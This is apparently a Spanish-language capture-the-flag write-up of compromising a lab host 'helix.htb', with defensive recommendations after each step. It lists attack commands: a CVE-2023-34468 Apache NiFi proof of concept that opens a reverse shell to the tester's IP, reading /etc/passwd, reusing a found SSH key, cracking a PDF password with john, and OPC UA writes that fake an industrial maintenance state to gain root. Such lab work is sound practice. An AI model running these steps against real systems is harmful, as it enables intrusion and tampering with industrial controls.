# Informe de análisis y enumeración

---

# 1. Escaneo inicial

Se realizó un escaneo de reconocimiento contra el objetivo `10.129.245.123` con el fin de identificar los servicios expuestos y obtener una visión inicial de la superficie de ataque. Durante esta fase se detectaron dos puertos abiertos: `22/tcp`, correspondiente a SSH, y `80/tcp`, correspondiente al servicio web ejecutado bajo nginx.

El análisis también mostró que el servicio HTTP redirigía al dominio `helix.htb`, por lo que fue necesario asociar ese nombre al host local para continuar con la enumeración.

**Comando utilizado:**

```bash
nmap -sS --open -sC -sV -n -Pn 10.129.245.123
```

<img width="1769" height="633" alt="image" src="https://github.com/user-attachments/assets/3aa5ecf8-f3e4-4037-b7dc-65ee5698bb99" />

**Recomendaciones:**

- Restringir el acceso SSH por IP o mediante VPN.
- Mantener los servicios expuestos actualizados.
- Revisar si el host debe responder con redirecciones públicas.

---

# 2. Enumeración web inicial

Tras configurar la resolución del dominio, se accedió a la página principal del servicio web para analizar su contenido e identificar posibles puntos de interacción. La aplicación respondió correctamente con código `200 OK` y mostró una página corporativa relacionada con Helix Industries, centrada en automatización industrial e infraestructura crítica.

Durante esta fase también se identificaron cabeceras y metadatos básicos del servidor, incluyendo el uso de nginx sobre Ubuntu y la presencia de una dirección de correo visible en el contenido.

**Comando utilizado:**

```bash
whatweb http://helix.htb/
```

<img width="2082" height="842" alt="image" src="https://github.com/user-attachments/assets/6a62adeb-6e25-4995-b8e9-f52f9872ed01" />

**Recomendaciones:**

- Reducir la información expuesta en el frontend.
- Evitar mostrar correos o datos de contacto en texto claro si no es necesario.
- Revisar qué metadatos y cabeceras se están publicando de forma accesible.

---

# 3. Pruebas manuales

Se realizó una prueba manual de la aplicación web con el objetivo de comprender su comportamiento e identificar posibles puntos de interacción. Sin embargo, no se encontró ningún elemento relevante con el que se pudiera interactuar directamente, por lo que esta fase se limitó a una revisión visual y funcional básica del contenido expuesto.

<img width="2268" height="1438" alt="image" src="https://github.com/user-attachments/assets/37f403c3-c85c-467c-893d-8913e5e52e2f" />

**Recomendaciones:**

- Minimizar la exposición pública innecesaria.
- Revisar qué contenido es accesible sin autenticación.
- Evitar mostrar información estática que no aporte valor al usuario final.

---

# 4. Descubrimiento de subdominios

Debido a que el servicio web parecía estar desplegado sobre una infraestructura basada en virtual hosts, se realizó una enumeración de subdominios mediante fuzzing del encabezado `Host`. El objetivo de esta fase era identificar servicios adicionales expuestos bajo el dominio principal `helix.htb`.

Durante la primera pasada con una lista reducida se detectó el subdominio `flow`. Posteriormente se amplió la búsqueda con una wordlist más grande para confirmar si existían otros virtual hosts, aunque no se obtuvieron más resultados relevantes.

**Comandos utilizados:**

```bash
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
ffuf -u http://helix.htb/ -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 154
```

<img width="1371" height="733" alt="image" src="https://github.com/user-attachments/assets/d7399804-35c7-45d3-b464-f2a21fa0494a" />

<img width="1595" height="968" alt="image" src="https://github.com/user-attachments/assets/2da546b3-46ec-4b43-853b-1949f2b85e66" />

**Recomendaciones:**

- Reducir la exposición de subdominios innecesarios.
- Proteger los servicios internos con autenticación robusta.
- Evitar respuestas diferenciadas que faciliten el reconocimiento.

---

# 5. Revisión del subdominio

Una vez identificado el subdominio, se realizó una revisión manual de su comportamiento para analizar su función, comprobar las opciones disponibles y determinar la versión de la tecnología utilizada. Esta fase ayudó a ampliar la enumeración y a definir mejor los posibles caminos de ataque.

<img width="1731" height="830" alt="image" src="https://github.com/user-attachments/assets/2ececbc0-09a8-41a5-83c2-b207edadb54b" />

**Recomendaciones:**

- Restringir el acceso a servicios internos.
- Ocultar información de versiones expuesta públicamente.
- Revisar si el subdominio debería estar disponible sin control adicional.

---

# 6. Rastreo y enumeración de rutas

A continuación se ejecutó un rastreo sobre el subdominio para localizar APIs, rutas internas y otros recursos que pudieran haberse pasado por alto durante la revisión manual. Los resultados mostraron principalmente archivos estáticos y referencias internas del entorno NiFi, sin aportar acceso útil adicional en ese momento.

**Comando utilizado:**

```bash
katana -u http://flow.helix.htb/nifi/ -jc -kf all -d 10
```

<img width="1828" height="877" alt="image" src="https://github.com/user-attachments/assets/d5af2325-40ce-403b-b61a-d79bc38eeb26" />

**Recomendaciones:**

- Limitar la exposición de rutas internas.
- Evitar publicar recursos estáticos innecesarios.
- Revisar la estructura del servicio para impedir una enumeración sencilla.

---

# 7. Identificación de versiones

Una vez identificada la versión expuesta, Apache NiFi 1.21.0, se revisaron tanto la página principal del puerto 80 como el subdominio para comprender mejor el servicio y su superficie de ataque. A partir de esta información, se investigaron exploits públicos relacionados con la tecnología detectada.

Durante la revisión apareció un módulo de Metasploit asociado a `CVE-2023-34468`, dirigido a Apache NiFi H2 RCE. El módulo se probó varias veces con distintos parámetros y cargas útiles, pero no proporcionó una sesión funcional, por lo que se descartó como vía directa de explotación en ese momento.

**Comandos utilizados:**

```bash
msfconsole
use exploit/linux/http/apache_nifi_h2_rce
options
set RHOSTS 10.129.227.225
run
```

<img width="1108" height="616" alt="image" src="https://github.com/user-attachments/assets/9584396e-cbe4-401f-bf5a-2da01a2684d2" />

<img width="1834" height="880" alt="image" src="https://github.com/user-attachments/assets/5913585b-11d0-4a0f-963e-3a629b0a2528" />

**Recomendaciones:**

- Mantener Apache NiFi actualizado.
- Restringir el acceso a las interfaces de administración.
- Revisar la exposición de componentes que permitan ejecución dinámica.

---

# 8. Búsqueda de explotación

Una vez identificada la versión del servicio, la enumeración se amplió mediante fuzzing para encontrar endpoints adicionales o contenido oculto. Sin embargo, los resultados no revelaron más rutas útiles ni servicios alternativos, confirmando que la superficie de ataque estaba limitada al subdominio analizado. En esta situación, se probó un exploit público de GitHub, que finalmente permitió obtener acceso interactivo al sistema.

<img width="1501" height="720" alt="image" src="https://github.com/user-attachments/assets/ce1340dc-ab9d-4454-b254-a0cbf11b0bf2" />

**Comando utilizado:**

```bash
python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.14.54 --lport 4444 --cleanup
```

<img width="1684" height="808" alt="image" src="https://github.com/user-attachments/assets/e60a5bad-2c9f-4d32-b694-135908a7f1ef" />

<img width="1604" height="794" alt="image" src="https://github.com/user-attachments/assets/ba7d16ff-eecf-484d-98cf-94afb0858c7f" />

**Recomendaciones:**

- Aplicar parches de seguridad de forma continua.
- No exponer servicios críticos sin autenticación.
- Limitar las posibilidades de ejecución remota en componentes de administración.

---

# 9. Acceso inicial al sistema

Una vez obtenida una shell inicial como el usuario `nifi`, se realizó una enumeración del sistema para identificar cuentas locales y comprender mejor el entorno comprometido. La revisión de `/etc/passwd` reveló cuentas de servicio como `nifi`, `plc` y `operator`, además de otras cuentas estándar del sistema.

A continuación, se confirmó la identidad del usuario actual y se exploró el directorio de instalación de NiFi, verificando la estructura típica del servicio y la presencia de varios directorios relacionados con repositorios internos, configuración, extensiones y registros.

**Comandos utilizados:**

```bash
cat /etc/passwd
id
script /dev/null
```

<img width="1758" height="1029" alt="image" src="https://github.com/user-attachments/assets/36dc014e-5a95-4fe1-9a76-3f24837a3e83" />

**Recomendaciones:**

- Revisar la presencia de cuentas de servicio innecesarias.
- Restringir permisos en los directorios de instalación.
- Proteger la información sensible expuesta en la configuración del servicio.

---

# 10. Hallazgo en `support-bundles`

Durante la enumeración local del directorio de instalación de NiFi se revisaron varios componentes del sistema. En esta exploración se localizó el directorio `support-bundles`, dentro del cual apareció un archivo llamado `operator_id_ed25519.bak`, algo relevante porque parecía ser una copia de una clave privada o una copia de seguridad asociada al usuario `operator`.

Este hallazgo sugirió la posible existencia de credenciales reutilizables o material sensible expuesto en disco, y se convirtió en uno de los puntos clave para las fases posteriores de enumeración.

**Comandos utilizados:**

```bash
ls
cd support-bundles
ls
```

<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/a21cea39-79cf-4569-80ce-3b44d7e689c4" />

**Recomendaciones:**

- No almacenar copias de claves privadas en directorios accesibles.
- Proteger las copias de credenciales con permisos estrictos.
- Revisar y eliminar artefactos sensibles innecesarios.

---

# 11. Clave privada recuperada

Durante la revisión del directorio `support-bundles` se encontró un archivo llamado `operator_id_ed25519.bak`, cuyo contenido correspondía a una clave privada de OpenSSH. Esto fue especialmente relevante porque ofrecía una posible vía adicional de acceso mediante autenticación SSH con el usuario `operator`.

**Comando utilizado:**

```bash
cat operator
```

**Contenido:**

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/fcfc8b5c-e012-4dd9-9450-afd91c5b06e5" />

**Recomendaciones:**

- No dejar copias de claves privadas en disco.
- Proteger cualquier copia de seguridad sensible con permisos estrictos.
- Revisar los artefactos de soporte para evitar que expongan credenciales reutilizables.

---

# 12. Acceso SSH

Una vez recuperada la clave privada, el archivo se descargó de forma local y se utilizó para establecer una conexión SSH con el usuario `operator` en el objetivo. El acceso fue exitoso y permitió una sesión interactiva sobre el sistema Ubuntu, confirmando que la clave correspondía a una cuenta válida en el host.

Tras iniciar sesión, el sistema mostró información general del host, incluyendo la versión de Ubuntu, el uso de disco y la dirección IP interna del equipo. A partir de ese momento, la enumeración continuó desde una posición más privilegiada que la shell anterior.

**Comando utilizado:**

```bash
ssh -i operator.key operator@10.129.245.123
```

<img width="2057" height="986" alt="image" src="https://github.com/user-attachments/assets/4a335df3-de7d-419f-908f-ce625d829462" />

**Recomendaciones:**

- Evitar reutilizar claves privadas en archivos de copia de seguridad.
- Revocar credenciales expuestas en directorios accesibles.
- Revisar el acceso SSH para cuentas de servicio y limitarlo cuando no sea necesario.

---

# 13. Enumeración local adicional

Tras acceder al sistema mediante SSH como `operator`, continuó la enumeración local del entorno y se revisaron archivos de configuración y documentación disponibles. Durante esta fase se inspeccionó el directorio de configuración de NiFi, y se intentó consultar información relacionada con servicios del host, aunque no se encontró el archivo esperado en `/etc/helix/config.ini`.

Más adelante, se descargaron localmente dos archivos de interés desde el directorio personal del usuario: `Operator Control & Safety Guide.pdf` y `control systems diagram.png`. Ambos documentos resultaron útiles para comprender mejor la arquitectura del entorno y el comportamiento general del sistema controlado por Helix.

**Comandos utilizados:**

```bash
cd /opt/nifi-1.21.0/conf
ls
cat /etc/helix/config.ini
sudo systemctl status helix-opc
scp -i operator.key operator@10.129.245.123:"/home/operator/Operator\ Control\ \&\ Safety\ Guide.pdf" ./Guia_Helix.pdf
scp -i operator.key operator@10.129.245.123:"/home/operator/control\ systems\ diagram.png" ./Diagrama_Helix.png
```

<img width="1456" height="533" alt="image" src="https://github.com/user-attachments/assets/1296f4b4-315b-4f9d-b16b-51a01ab4ae7d" />

**Recomendaciones:**

- Documentar y proteger los archivos operativos sensibles.
- Evitar dejar manuales o diagramas accesibles sin control.
- Revisar los permisos sobre la información técnica del entorno.

---

# 14. PDF protegido

Al abrir el PDF, se confirmó que estaba protegido con contraseña, lo que hizo sospechar que podía contener información sensible o documentación interna importante. Por ello, se extrajo su hash para intentar recuperar la contraseña y comprender qué información estaba siendo protegida.

Un ataque de diccionario con `rockyou.txt` permitió recuperar la contraseña del documento, que resultó ser `operator1`. Esto confirmó que el archivo no contenía credenciales directas, sino documentación interna protegida que merecía un análisis más profundo.

**Comandos utilizados:**

```bash
cat hash_pdf.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --encoding=ISO-8859-1 hash_pdf.txt
```

<img width="1442" height="430" alt="image" src="https://github.com/user-attachments/assets/d493b011-8e62-46e4-8a3c-71908620c324" />

**Recomendaciones:**

- Proteger los documentos sensibles con contraseñas robustas.
- Evitar contraseñas débiles o predecibles.
- Revisar el contenido de guías y manuales internos para que no expongan información crítica.

---

# 15. Análisis de la documentación

Durante la enumeración del sistema se encontraron varios archivos en el directorio de configuración que inicialmente no parecían especialmente relevantes. Antes de profundizar en ellos, se intentó localizar una contraseña, una credencial mal almacenada o cualquier dato sensible que facilitara el acceso a otras partes del entorno, aunque no se obtuvo ningún resultado útil en esa dirección.

Con el tiempo, esos archivos se revisaron con más detalle debido a que la presencia de una guía en PDF y un diagrama PNG dentro de un directorio orientado a configuración resultaba llamativa. Esto sugirió que podían aportar contexto sobre la arquitectura del sistema o su funcionamiento interno, más que credenciales reutilizables de forma directa.

<img width="1131" height="769" alt="image" src="https://github.com/user-attachments/assets/f22387c2-c3e1-44d8-8c69-51b38913eb8a" />

<img width="1343" height="968" alt="image" src="https://github.com/user-attachments/assets/a4d1345b-8649-40f6-9f30-222b07162ce8" />

**Recomendaciones:**

- Separar la documentación operativa de los directorios de configuración.
- Proteger los manuales internos con control de acceso.
- Evitar almacenar material sensible en ubicaciones predecibles.

---

# 16. Escalada de privilegios a root

La escalada de privilegios a root se basó en una condición operativa muy concreta del entorno, también descrita en la documentación recuperada. Tras revisar los privilegios del usuario `operator`, se confirmó que el binario `/usr/local/sbin/helix-maint-console` podía ejecutarse como root sin contraseña.

La guía PDF también indicaba que, para activar el acceso privilegiado, era necesario simular un estado de mantenimiento del sistema. Para ello se modificaron varios valores mediante escrituras OPC UA, estableciendo el modo de operación en `MAINTENANCE`, activando el indicador correspondiente y ajustando la temperatura a un valor superior al umbral esperado.

Una vez cumplidas esas condiciones, la ejecución de `helix-maint-console` otorgó acceso privilegiado temporal al sistema, lo que hizo posible obtener una shell de root y leer el archivo `root.txt`.

**Comandos utilizados:**

```bash
sudo -l
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=12" -t string "MAINTENANCE"
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=13" -t bool true
uawrite -u opc.tcp://127.0.0.1:4840/helix/ -n "ns=2;i=6" -t double 11.0
sudo /usr/local/sbin/helix-maint-console
cat /root/root.txt
```

<img width="2091" height="678" alt="image" src="https://github.com/user-attachments/assets/9dac7b9f-484d-4cb4-90ef-a5ed02a8b531" />

**Recomendaciones:**

- Revisar cuidadosamente los binarios delegados con sudo.
- No depender de condiciones operativas que puedan manipularse con facilidad.
- Validar que los modos de mantenimiento no puedan activarse externamente sin controles adicionales.

---

# 17. Resultados finales

Durante el análisis, se obtuvo acceso inicial mediante la explotación del servicio Apache NiFi, se consiguió una shell inicial como usuario `nifi`, después se localizó una clave privada reutilizable para acceder como `operator` por SSH y, finalmente, se logró la escalada a root manipulando el estado de mantenimiento del sistema.

El compromiso del host se completó por completo, demostrando una cadena de exposición formada por enumeración insuficiente, credenciales reutilizables y validación débil de condiciones operativas.

**Artefactos obtenidos:**

- `user.txt`
- `root.txt`

**Diagrama de ataque:**

```text
Nmap
↓
helix.htb
↓
FFUF
↓
flow.helix.htb
↓
Apache NiFi 1.21.0
↓
CVE-2023-34468
↓
Shell (nifi)
↓
operator_id_ed25519.bak
↓
SSH operator
↓
PDF + OPC UA
↓
sudo helix-maint-console
↓
root
```
